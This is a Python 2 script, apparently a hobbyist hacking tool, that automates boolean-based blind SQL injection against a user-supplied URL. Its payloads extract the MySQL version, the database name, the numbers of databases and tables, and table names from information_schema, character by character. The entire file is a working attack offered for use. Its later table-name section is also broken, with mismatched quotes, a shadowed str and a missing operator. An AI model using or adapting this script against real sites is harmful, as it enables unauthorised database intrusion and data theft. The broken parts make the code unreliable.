from bs4 import BeautifulSoup, SoupStrainer
import requests
import requests.exceptions
from urlparse import urlsplit
from collections import deque
import re
import code
import argparse
import sys

#---------------By fl337
#---------------Date 4/11/2018

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument(dest='url', help='Add url you want to pwn')
	args = parser.parse_args()

	#get url's content
	url = str(args.url)
	
	res_good = requests.get(url)
	
	print("[+]--- URL IS LOOKING GOOD ;) : %s" % url)
	print("[+]--- VERIFYING BOOLEAN BLIND SQLi")

	#Check for boolean based blind sql injection
	sqli_url = url + " and 1=2#"
	try:
		res_bad = requests.get(sqli_url)
	except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
		print("[+]--- SOMETHING WENT WRONG!!!!")
		sys.exit()
	
	if( len(res_good.text)==len(res_bad.text) ):
		print("[+]--- NO BOOLEAN BLIND SQLi T.T")
		sys.exit()
	else:
		print("[+]--- BOOL BLIND SQL VERIFIED!! ^.^")

	print("[+]--- EXTRACTING MYSQL VERSION...")
	for i in range(0,10):
		#Checking the mysql version through SHEER FORCE OF WILL 9.9
		sqli_url = url + " and substring(version(),1,1)=" + str(i) +"#"

		try:
			res_bad = requests.get(sqli_url)
		except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
			print("[+]--- SOMETHING WENT WRONG!!!!")
			sys.exit()
		if( len(res_bad.text)==len(res_good.text) ):
			print("[+]--- mySQL VERSION : %s" % str(i))
			break

	print("[+]--- EXTRACTING NAME LENGTH OF CURRENT DATABASE...")
	cur_db_length = 0
	for i in range(0,20):
		#BRUTING OUR WAY TO THE ANSWERS ONCE MORE 9.9
		sqli_url = url + " and length(database())=" + str(i) +"#"
		try:
			res_bad = requests.get(sqli_url)
		except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
			print("[+]--- SOMETHING WENT WRONG!!!!")
			sys.exit()
		if( len(res_bad.text)==len(res_good.text) ):
			print("[+]--- DATABASE NAME LENGTH : %s" % str(i))
			cur_db_length = i
			break

	print("[+]--- EXTRACTING CURRENT DATABASE'S NAME...")
	cur_db_name = ""
	for i in range(1,cur_db_length+1):
		#YO BOIS GOT HIS FREE TACOOOO
		sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))>=43 and ascii(substring(database()," + str(i) + ",1))<=122#"
		try:
			res_bad = requests.get(sqli_url)
		except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
			print("[+]--- SOMETHING WENT WRONG!!!!")
			sys.exit()
		if( len(res_bad.text)!=len(res_good.text) ):
			print("[+]--- CHAR %s is not within ASCII RANGE!" % str(i))
			sys.exit()

	print("[+]--- ALL CHARACTERS WITHIN RANGE...")
	for i in range(1,cur_db_length+1):
		#TIME TO GET INTERESTING...
		lower=0;
		upper=0;
		sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))>=83#"
		try:
			res_bad = requests.get(sqli_url)
		except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
			print("[+]--- SOMETHING WENT WRONG!!!!")
			sys.exit()
		if( len(res_bad.text)==len(res_good.text) ):
			sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))>=103#"
			try:
				res_bad = requests.get(sqli_url)
			except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
				print("[+]--- SOMETHING WENT WRONG!!!!")
				sys.exit()
			if( len(res_bad.text)==len(res_good.text) ):
				sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))>=113#"
				try:
					res_bad = requests.get(sqli_url)
				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
					print("[+]--- SOMETHING WENT WRONG!!!!")
					sys.exit()
				if( len(res_bad.text)==len(res_good.text) ):
					# print("[+]--- RANGE 113-122")
					lower = 113
					upper = 122
				else:
					# print("[+]--- RANGE 103-113")
					lower = 103
					upper = 133
			else:

				sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))>=93#"
				try:
					res_bad = requests.get(sqli_url)
				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
					print("[+]--- SOMETHING WENT WRONG!!!!")
					sys.exit()
				if( len(res_bad.text)==len(res_good.text) ):
					# print("[+]--- RANGE 93-103")
					lower = 93
					upper = 103
				else:
					# print("[+]--- RANGE 83-93")
					lower = 83
					upper = 93
		else:
			sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))>=63#"
			try:
				res_bad = requests.get(sqli_url)
			except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
				print("[+]--- SOMETHING WENT WRONG!!!!")
				sys.exit()
			if( len(res_bad.text)==len(res_good.text) ):
				sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))>=73#"
				try:
					res_bad = requests.get(sqli_url)
				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
					print("[+]--- SOMETHING WENT WRONG!!!!")
					sys.exit()
				if( len(res_bad.text)==len(res_good.text) ):
					# print("[+]--- RANGE 73-83")
					lower = 73
					upper = 83
				else:
					# print("[+]--- RANGE 63-73")
					lower = 63
					upper = 73
			else:

				sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))>=53#"
				try:
					res_bad = requests.get(sqli_url)
				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
					print("[+]--- SOMETHING WENT WRONG!!!!")
					sys.exit()
				if( len(res_bad.text)==len(res_good.text) ):
					# print("[+]--- RANGE 53-63")
					lower = 53
					upper = 63
				else:
					# print("[+]--- RANGE 43-53")
					lower = 43
					upper = 53
		for j in range(lower,upper):
			#YOU ALREADY KNOW WHAT IT IS ;)
			sqli_url = url + " and ascii(substring(database()," + str(i) + ",1))=" + str(j) +"#"
			try:
				res_bad = requests.get(sqli_url)
			except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
				print("[+]--- SOMETHING WENT WRONG!!!!")
				sys.exit()
			if( len(res_bad.text)==len(res_good.text) ):
				# print("[+]--- DATABASE NAME CHAR ASCII : %s" % str(unichr(j)))
				cur_db_name = cur_db_name + str(unichr(j))
				break
	print("[+]--- CURRENT DB_NAME: %s" % cur_db_name)
	print("[+]--- EXTRACTING NUMBER OF DATABASES...")
	db_count = 0;
	for i in range(0,20):
		#YO BOI IS NICE ;D 
		sqli_url = url + " and (select count(*) from information_schema.schemata)=" + str(i) +"#"

		try:
			res_bad = requests.get(sqli_url)
		except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
			print("[+]--- SOMETHING WENT WRONG!!!!")
			sys.exit()
		if( len(res_bad.text)==len(res_good.text) ):
			print("[+]--- # OF DATABASES: %s" % str(i))
			db_count = i
			break
	
	print("[+]--- EXTRACTING NUMBER OF TABLES...")
	table_count = 0;
	for i in range(0,50):
		#WHY SO EASY 0.0 
		sqli_url = url + " and (select count(*) from information_schema.tables where table_schema='"+ cur_db_name +"')=" + str(i) +"#"
		try:
			res_bad = requests.get(sqli_url)
		except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
			print("[+]--- SOMETHING WENT WRONG!!!!")
			sys.exit()
		if( len(res_bad.text)==len(res_good.text) ):
			print("[+]--- # OF TABLES: %s" % str(i))
			table_count = i
			break

	print("[+]--- EXTRACTING LENGTHS OF TABLE NAMES...")
	table_name_lengths = []
	for i in range(0,table_count):
		for j in range(0,30):
			sqli_url = url +" and length((select table_name from information_schema.tables where table_schema='"+ cur_db_name +"' limit " + str(i) +",1))="+ str(j) +"#"                        
			try:
				res_bad = requests.get(sqli_url)
			except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
				print("[+]--- SOMETHING WENT WRONG!!!!")
				sys.exit()
			if( len(res_bad.text)==len(res_good.text) ):
				table_name_lengths.append(j)
				break
	print("[+]--- TABLE NAME LENGTHS:")
	print(table_name_lengths)
	print("[+]--- EXTRACTING TABLE NAMES")
	table_name = []
	for q in range(0,len(table_name_lengths)):
		cur_name = ""
		print("[+]--- WORKING ON TABLE %s" % str(q))
		for i in range(1,table_name_lengths[q]):
			#YO BOIS GOT HIS FREE TACOOOO
			sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=43#"
			sqli_url = sqli_url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))<=122#"
			try:
				res_bad = requests.get(sqli_url)
			except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
				print("[+]--- SOMETHING WENT WRONG!!!!")
				sys.exit()
			if( len(res_bad.text)!=len(res_good.text) ):
				print("[+]--- CHAR %s is not within ASCII RANGE!" % str(i))
				sys.exit()

		print("[+]---TABLE %s ALL CHARACTERS WITHIN RANGE..." % str)
		for i in range(1,table_name_lengths[q]):
			#TIME TO GET INTERESTING...
			lower=0;
			upper=0;
			sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=83#"
			try:
				res_bad = requests.get(sqli_url)
			except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
				print("[+]--- SOMETHING WENT WRONG!!!!")
				sys.exit()
			if( len(res_bad.text)==len(res_good.text) ):
				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=103#"
				try:
					res_bad = requests.get(sqli_url)
				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
					print("[+]--- SOMETHING WENT WRONG!!!!")
					sys.exit()
				if( len(res_bad.text)==len(res_good.text) ):
					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=113#"
					try:
						res_bad = requests.get(sqli_url)
					except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
						print("[+]--- SOMETHING WENT WRONG!!!!")
						sys.exit()
					if( len(res_bad.text)==len(res_good.text) ):
						# print("[+]--- RANGE 113-122")
						lower = 113
						upper = 122
					else:
						# print("[+]--- RANGE 103-113")
						lower = 103
						upper = 133
				else:

					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=93#"
					try:
						res_bad = requests.get(sqli_url)
					except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
						print("[+]--- SOMETHING WENT WRONG!!!!")
						sys.exit()
					if( len(res_bad.text)==len(res_good.text) ):
						# print("[+]--- RANGE 93-103")
						lower = 93
						upper = 103
					else:
						# print("[+]--- RANGE 83-93")
						lower = 83
						upper = 93
			else:
				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=63#"
				try:
					res_bad = requests.get(sqli_url)
				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
					print("[+]--- SOMETHING WENT WRONG!!!!")
					sys.exit()
				if( len(res_bad.text)==len(res_good.text) ):
					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=73#"
					try:
						res_bad = requests.get(sqli_url)
					except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
						print("[+]--- SOMETHING WENT WRONG!!!!")
						sys.exit()
					if( len(res_bad.text)==len(res_good.text) ):
						# print("[+]--- RANGE 73-83")
						lower = 73
						upper = 83
					else:
						# print("[+]--- RANGE 63-73")
						lower = 63
						upper = 73
				else:

					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=53#"
					try:
						res_bad = requests.get(sqli_url)
					except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
						print("[+]--- SOMETHING WENT WRONG!!!!")
						sys.exit()
					if( len(res_bad.text)==len(res_good.text) ):
						# print("[+]--- RANGE 53-63")
						lower = 53
						upper = 63
					else:
						# print("[+]--- RANGE 43-53")
						lower = 43
						upper = 53
			for j in range(lower,upper):
				#YOU ALREADY KNOW WHAT IT IS ;)
				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))="+str(j)+"#"
				try:
					res_bad = requests.get(sqli_url)
				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
					print("[+]--- SOMETHING WENT WRONG!!!!")
					sys.exit()
				if( len(res_bad.text)==len(res_good.text) ):
					# print("[+]--- DATABASE NAME CHAR ASCII : %s" % str(unichr(j)))
					cur_name = cur_name + str(unichr(j))
					break
			str = "Table #" + str(q) + " = " cur_name
			print(str)
	print("[+]--- ALL DONE KEEP IT LEET f1337")
	sys.exit()

